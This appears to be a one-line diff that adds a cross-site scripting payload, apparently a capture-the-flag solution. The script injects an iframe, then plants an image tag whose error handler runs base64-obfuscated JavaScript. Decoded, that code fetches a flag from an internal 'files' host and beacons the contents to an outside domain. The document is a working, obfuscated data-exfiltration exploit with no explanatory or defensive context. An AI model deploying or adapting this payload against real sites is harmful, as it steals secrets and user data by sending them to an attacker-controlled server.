@@ -1,0 +1,1 @@
+<script>const iframe = document.createElement("iframe");iframe.src = "/404";document.body.appendChild(iframe);setTimeout(()=>{iframe.contentWindow.document.body.innerHTML = `<img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly9maWxlczo4MDgwL2ZsYWciKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKHQ9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwOi8vcmVuYm91LnJ1Iix0KSk7'))" />`;},1000)</script>
